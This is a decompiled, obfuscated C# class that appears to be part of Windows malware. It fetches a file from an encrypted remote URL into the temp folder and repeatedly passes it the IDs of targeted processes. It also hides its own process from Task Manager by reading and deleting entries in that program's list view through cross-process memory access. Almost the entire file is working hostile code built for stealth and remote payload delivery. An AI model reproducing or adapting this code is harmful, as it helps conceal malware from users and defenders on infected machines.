using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

internal sealed class NavszWhCFln
{
	private struct uvfIJxlTBJeTTEcS
	{
		public uint vbGeKWGgHtE;

		public IntPtr jSIaIVNRVC;

		public IntPtr TMZHRUWrrJmeZ;

		public uint soIGwFtglNiNf;

		public uint ZFBuAMfxkUsJQZS;

		public IntPtr vAeRsKPlAnEl;

		public uint ZIPLycKFQGI;

		public int ipfDagaFDuKuzZ;

		public IntPtr TMGJeZDwaKL;
	}

	private static volatile bool iVetrVvnHHh;

	public static volatile bool FSKAKuFoTO;

	[NonSerialized]
	internal static GetString getString_0;

	public static string UgWaHhAMduOlw()
	{
		if (IntPtr.Size == 8)
		{
			QIACJnVixgJVTY.rykURPyMqBPZA = WBCJwcBcgAog(new Uri(QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367010))));
		}
		else
		{
			QIACJnVixgJVTY.rykURPyMqBPZA = WBCJwcBcgAog(new Uri(QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107366896))));
		}
		return QIACJnVixgJVTY.rykURPyMqBPZA;
	}

	public static string WBCJwcBcgAog(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107369932), getString_0(107360147)).Remove(0, 3) + getString_0(107369248);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process frkLfppCYfQZ(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void vDpmElyRVQxxithWV(string[] string_0)
	{
		string text = UgWaHhAMduOlw();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = frkLfppCYfQZ(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					QIACJnVixgJVTY.JwEyRGqWlKuPhwH(text, text2 + getString_0(107359216) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					QIACJnVixgJVTY.JwEyRGqWlKuPhwH(text, text2 + getString_0(107359216) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107366206));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr UhdKVpnthgPw);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr qIWjjSHShmFbgZP, IntPtr MqVnqErqhiA, byte[] dKKEosrHXXD, uint zgTEXdcxzDRGlf, out UIntPtr HLEUFvjGwAaeJ);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr kRsndVsXjsnQ, IntPtr uTwqdBEJQYUjWx, [Out] byte[] UYelpsPoOYlJz, int TiUHyYirhGX, out UIntPtr ZHhauLXUsl);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr pOREwxNwoKjFFz, out uint BFdlFrznQmdNH);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] VpDlERhQhIsZZ(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr WXLMjkKOYPAV(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void bYKauASvOWNlCIVkvU(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr cJfUmRocrMqcCE(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void WgQKrzVJMXb(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr sgRrYgyzAKwL()
	{
		IntPtr intPtr = FindWindow(getString_0(107366229), getString_0(107366172));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107366139), getString_0(107366162));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366139), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366113), getString_0(107366124));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366139), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107366113), getString_0(107366591));
	}

	private static IntPtr kuSIGSSCBq(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void LKazRbjinChnVkp(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void vonhQGRWNXb(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string SmrEHvbalSw(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		uvfIJxlTBJeTTEcS uvfIJxlTBJeTTEcS = default(uvfIJxlTBJeTTEcS);
		GetWindowThreadProcessId(intptr_0, out var BFdlFrznQmdNH);
		IntPtr intPtr = WXLMjkKOYPAV(BFdlFrznQmdNH);
		IntPtr intPtr2 = cJfUmRocrMqcCE((uint)Marshal.SizeOf(uvfIJxlTBJeTTEcS), intPtr);
		IntPtr intPtr3 = cJfUmRocrMqcCE(50u, intPtr);
		uvfIJxlTBJeTTEcS.jSIaIVNRVC = intptr_1;
		uvfIJxlTBJeTTEcS.TMZHRUWrrJmeZ = (IntPtr)0;
		uvfIJxlTBJeTTEcS.ZIPLycKFQGI = 50u;
		uvfIJxlTBJeTTEcS.vAeRsKPlAnEl = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, VpDlERhQhIsZZ(uvfIJxlTBJeTTEcS), (uint)Marshal.SizeOf(uvfIJxlTBJeTTEcS), out var HLEUFvjGwAaeJ);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out HLEUFvjGwAaeJ);
		WgQKrzVJMXb(intPtr, intPtr2, (uint)Marshal.SizeOf(uvfIJxlTBJeTTEcS));
		WgQKrzVJMXb(intPtr, intPtr3, 50u);
		bYKauASvOWNlCIVkvU(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void bYfysPhfYzu(string string_0)
	{
		IntPtr intPtr = sgRrYgyzAKwL();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)kuSIGSSCBq(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = SmrEHvbalSw(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				LKazRbjinChnVkp(intPtr, (IntPtr)i);
			}
		}
	}

	private static void WxFYFEAxgNYe()
	{
		IntPtr intPtr = sgRrYgyzAKwL();
		if (intPtr != IntPtr.Zero)
		{
			vonhQGRWNXb(intPtr);
			vonhQGRWNXb(intPtr);
			vonhQGRWNXb(intPtr);
			vonhQGRWNXb(intPtr);
			vonhQGRWNXb(intPtr);
		}
	}

	public static void HrnoVUKSfBpCQcR()
	{
		Thread thread = new Thread(BCVmtzpulXoLMN);
		thread.Start();
	}

	private static void BCVmtzpulXoLMN()
	{
		while (!iVetrVvnHHh)
		{
			if (FSKAKuFoTO)
			{
				bYfysPhfYzu(Process.GetCurrentProcess().ProcessName + getString_0(107369248));
				Thread.Sleep(525);
			}
			else
			{
				WxFYFEAxgNYe();
				Thread.Sleep(1000);
			}
		}
		iVetrVvnHHh = false;
	}

	static NavszWhCFln()
	{
		Strings.CreateGetStringDelegate(typeof(NavszWhCFln));
		iVetrVvnHHh = false;
		FSKAKuFoTO = true;
	}
}
